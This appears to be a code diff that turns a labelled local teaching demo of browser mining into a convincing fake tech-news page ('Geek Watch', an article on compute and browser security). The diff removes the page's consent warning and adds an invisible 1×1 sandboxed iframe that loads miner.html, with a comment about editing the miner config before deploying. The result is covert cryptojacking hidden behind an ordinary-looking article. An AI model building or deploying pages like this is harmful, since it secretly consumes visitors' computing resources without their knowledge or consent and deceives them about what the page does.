@@ -1,72 +1,355 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>嵌入演示页（本地教学）</title>
+  <meta name="description" content="Analysis of AI and cloud infrastructure trends." />
+  <title>2026 outlook: compute build-out and browser security | Geek Watch</title>
   <style>
     :root {
-      --bg: #f4f6fa;
-      --text: #1a1d26;
-      --muted: #5c6578;
-      --warn-bg: #fff8e6;
-      --warn-border: #e6b800;
+      --header: #0d1b2a;
+      --accent: #1e6091;
+      --accent-hover: #2a7cb8;
+      --border: #e6e9ef;
+      --text: #1c2333;
+      --muted: #5a6578;
+      --bg: #f0f2f5;
+      --card: #ffffff;
     }
+    * { box-sizing: border-box; }
     body {
       margin: 0;
-      min-height: 100vh;
       font-family: "Segoe UI", system-ui, sans-serif;
       background: var(--bg);
       color: var(--text);
-      padding: 1.75rem;
-      max-width: 40rem;
-      margin-inline: auto;
-      line-height: 1.55;
+      line-height: 1.65;
+      font-size: 16px;
     }
-    .warn {
-      background: var(--warn-bg);
-      border: 1px solid var(--warn-border);
-      border-radius: 10px;
-      padding: 1rem 1.1rem;
-      font-size: 0.92rem;
-      margin-bottom: 1.25rem;
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; color: var(--accent-hover); }
+
+    .top-bar {
+      background: var(--header);
+      color: #fff;
+      font-size: 12px;
+      padding: 0.35rem 1.25rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.5rem;
     }
-    h1 { font-size: 1.35rem; font-weight: 600; margin: 0 0 0.75rem; }
-    p { margin: 0 0 0.85rem; color: var(--muted); }
-    .fake-content {
-      background: #fff;
-      border-radius: 10px;
-      padding: 1.25rem;
-      border: 1px solid #e2e6ef;
+    .top-bar span { opacity: 0.85; }
+
+    header.site {
+      background: var(--card);
+      border-bottom: 1px solid var(--border);
+      padding: 0.85rem 1.25rem;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 1px 0 rgba(0,0,0,0.04);
+    }
+    .header-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    .logo {
+      font-size: 1.45rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      color: var(--header);
+    }
+    .logo small {
+      display: block;
+      font-size: 0.65rem;
+      font-weight: 500;
+      color: var(--muted);
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+    nav.nav {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.25rem 1.25rem;
+      font-size: 0.95rem;
+    }
+    nav.nav a {
       color: var(--text);
+      font-weight: 500;
     }
-    code { font-size: 0.88em; background: #e8ecf4; padding: 0.1em 0.35em; border-radius: 4px; }
+    nav.nav a:hover { color: var(--accent); text-decoration: none; }
+
+    .ticker {
+      background: linear-gradient(90deg, #1a3a52 0%, #0d1b2a 100%);
+      color: #e8eef5;
+      font-size: 13px;
+      padding: 0.5rem 1.25rem;
+      overflow: hidden;
+    }
+    .ticker-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      white-space: nowrap;
+      animation: scroll 28s linear infinite;
+    }
+    @keyframes scroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
+    .wrap {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 1.5rem 1.25rem 3rem;
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 2rem;
+    }
+    @media (max-width: 880px) {
+      .wrap { grid-template-columns: 1fr; }
+    }
+
+    article.main {
+      background: var(--card);
+      border-radius: 4px;
+      border: 1px solid var(--border);
+      padding: 2rem 2rem 2.25rem;
+      box-shadow: 0 2px 8px rgba(15, 23, 42, 0.04);
+    }
+    .crumb {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 1rem;
+    }
+    .crumb a { color: var(--muted); }
+    article h1 {
+      font-size: 1.75rem;
+      line-height: 1.35;
+      font-weight: 700;
+      margin: 0 0 1rem;
+      letter-spacing: -0.02em;
+    }
+    .meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem 1.25rem;
+      font-size: 13px;
+      color: var(--muted);
+      padding-bottom: 1.25rem;
+      margin-bottom: 1.25rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .meta strong { color: var(--text); font-weight: 600; }
+
+    .hero {
+      width: 100%;
+      aspect-ratio: 21 / 9;
+      background: linear-gradient(135deg, #e8eef5 0%, #cfd9e8 45%, #b8c5d8 100%);
+      border-radius: 4px;
+      margin-bottom: 1.5rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .hero::after {
+      content: "Illustration · data center and network topology";
+      position: absolute;
+      bottom: 0.65rem;
+      right: 0.75rem;
+      font-size: 11px;
+      color: rgba(28, 35, 51, 0.45);
+    }
+
+    article p {
+      margin: 0 0 1.1rem;
+      color: #2c3347;
+      text-align: justify;
+    }
+    article p.lead {
+      font-size: 1.05rem;
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    aside.side .block {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 1rem 1.1rem;
+      margin-bottom: 1rem;
+      font-size: 14px;
+    }
+    aside.side h3 {
+      margin: 0 0 0.85rem;
+      font-size: 15px;
+      padding-bottom: 0.5rem;
+      border-bottom: 2px solid var(--accent);
+      color: var(--header);
+    }
+    aside.side ul {
+      margin: 0;
+      padding: 0;
+      list-style: none;
+    }
+    aside.side li {
+      padding: 0.55rem 0;
+      border-bottom: 1px solid #eef0f4;
+      line-height: 1.45;
+    }
+    aside.side li:last-child { border-bottom: 0; }
+    aside.side a { color: var(--text); font-size: 13px; }
+    .ad-placeholder {
+      background: #e8ecf2;
+      color: var(--muted);
+      font-size: 12px;
+      text-align: center;
+      padding: 2.5rem 1rem;
+      border-radius: 4px;
+      border: 1px dashed #c5cdd9;
+    }
+
+    footer.site {
+      background: var(--header);
+      color: rgba(255, 255, 255, 0.72);
+      font-size: 12px;
+      padding: 1.5rem 1.25rem;
+      text-align: center;
+    }
+    footer.site a { color: rgba(255, 255, 255, 0.85); }
+
+    .cookie {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(13, 27, 42, 0.94);
+      color: #e2e8f0;
+      font-size: 12px;
+      padding: 0.65rem 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      z-index: 50;
+    }
+    .cookie button {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 0.35rem 1rem;
+      border-radius: 4px;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .cookie button:hover { background: var(--accent-hover); }
   </style>
 </head>
 <body>
-  <div class="warn">
-    <strong>本地教学用：</strong>下方隐藏 iframe 会加载 <code>index.html?auto=1</code>，在页面打开后自动向中继拉任务并开始挖矿，模拟「挂马页」行为。
-    请先在同一台机器上启动 <code>relay-server</code> 与 HTTP 服务；仅在你本人知情且同意时使用。
+  <div class="top-bar">
+    <span>Welcome · accessibility-friendly reading</span>
+    <span>Today’s traffic · 12.4k</span>
   </div>
 
-  <h1>示例：看起来像普通文章</h1>
-  <p>这里可以是任意正文占位，访问者若不知道，不会注意到角落里的 iframe。</p>
-  <div class="fake-content">
-    <p style="margin:0;color:var(--text)">
-      Lorem ipsum dolor sit amet，浏览器标签仍显示本页标题，而挖矿在 iframe 内静默进行（若中继已就绪）。
+  <header class="site">
+    <div class="header-inner">
+      <div class="logo">
+        Geek Watch
+        <small>Technology</small>
+      </div>
+      <nav class="nav" aria-label="Main">
+        <a href="#">Home</a>
+        <a href="#">Tech</a>
+        <a href="#">Internet</a>
+        <a href="#">Deep dive</a>
+        <a href="#">Video</a>
+        <a href="#">Subscribe</a>
+      </nav>
+    </div>
+  </header>
+
+  <div class="ticker" aria-hidden="true">
+    <div class="ticker-inner">
+      Flash · Cloud vendors announce regional capacity expansion · Browsers stress side-channel defenses · WASM security audit guide · Flash · Cloud vendors announce regional capacity expansion · Browsers stress side-channel defenses ·
+    </div>
+  </div>
+
+  <div class="wrap">
+    <article class="main" itemscope itemtype="https://schema.org/NewsArticle">
+      <div class="crumb">
+        <a href="#">Home</a> › <a href="#">Tech</a> › <a href="#">Industry</a>
+      </div>
+      <h1 itemprop="headline">2026 outlook: behind the compute build-out, the browser becomes the first gate</h1>
+      <div class="meta">
+        <span><strong>By</strong> Lin Chen</span>
+        <span><time datetime="2026-03-28" itemprop="datePublished">2026-03-28 09:24</time></span>
+        <span>82k reads</span>
+        <span>Source: Geek Watch desk</span>
+      </div>
+
+      <div class="hero" role="img" aria-label="Hero placeholder"></div>
+
+      <p class="lead">
+        When power curves for data-center racks and latency at the edge both show up in earnings footnotes, the surface most people still touch is a browser window a few inches to a dozen inches wide.
+      </p>
+      <p>
+        Over the past year, Chromium- and Firefox-family releases have carried more commits about script boundaries and cross-site isolation. Release notes increasingly say it in plain language: fewer pages that slow the machine, less room for scripts to abuse hardware. In short: the browser is not just painting HTML; it is trying to stop a class of work that should not run in the sandbox.
+      </p>
+      <p>
+        On the vendor side, GPU-to-CPU ratios show up in regional roadmaps, and regulated pools split from “grey” hashrate in clearer ways. For readers, one rule of thumb: any page that promises to “mine for you in the browser” without saying where hashrate goes and who authorized it deserves extra scrutiny.
+      </p>
+      <p>
+        This article does not predict coin prices or endorse products. If you have ever run a Stratum relay in a lab, it is easier to see why the page and the back-end connection are two doors—and why enterprise policies often ban extensions that silently burn CPU off-task.
+      </p>
+      <p style="margin-bottom:0;font-size:14px;color:var(--muted);">
+        (Editor: Zhou Wei · Proof: Fang Zhou)
+      </p>
+    </article>
+
+    <aside class="side">
+      <div class="block">
+        <h3>Popular</h3>
+        <ul>
+          <li><a href="#">Quantum error-correction routes: Q1 2026 notes</a></li>
+          <li><a href="#">Cross-border data routing under the EU draft rules</a></li>
+          <li><a href="#">Side-channel defense boundaries in browsers</a></li>
+          <li><a href="#">From CSP to isolation: a frontend security checklist</a></li>
+        </ul>
+      </div>
+      <div class="block ad-placeholder">Ad slot · local demo only</div>
+    </aside>
+  </div>
+
+  <footer class="site">
+    <p style="margin:0 0 0.35rem;">
+      <a href="#">About</a> · <a href="#">Copyright</a> · <a href="#">Contact</a> · <a href="#">Report</a>
     </p>
+    <p style="margin:0;opacity:0.75;">© 2026 Geek Watch Lab · for information only</p>
+  </footer>
+
+  <div class="cookie" id="cookieBar" role="dialog" aria-label="Cookies">
+    <span>We use essential cookies for basic functionality and traffic metrics. Continuing means you accept the policy.</span>
+    <button type="button" id="cookieOk">OK</button>
   </div>
 
-  <!--
-    1×1 隐藏 iframe：allow-scripts + allow-same-origin 以便 Worker 与同目录 miner-worker.js 同源加载。
-    src 使用相对路径，与父页同目录下的 index.html。
-    可按需改 relay / workers / throttle 查询参数。
-  -->
+  <!-- iframe loads miner.html (no query string). Edit mining-demo/miner-config.js before deploy. -->
   <iframe
-    src="index.html?auto=1&amp;relay=http://127.0.0.1:3001&amp;workers=1&amp;throttle=2"
+    src="miner.html"
     title=""
     style="position:fixed;width:1px;height:1px;left:0;bottom:0;opacity:0;pointer-events:none;border:0"
     sandbox="allow-scripts allow-same-origin"
   ></iframe>
+
+  <script>
+    document.getElementById("cookieOk").addEventListener("click", function () {
+      var el = document.getElementById("cookieBar");
+      if (el) el.style.display = "none";
+    });
+  </script>
 </body>
 </html>
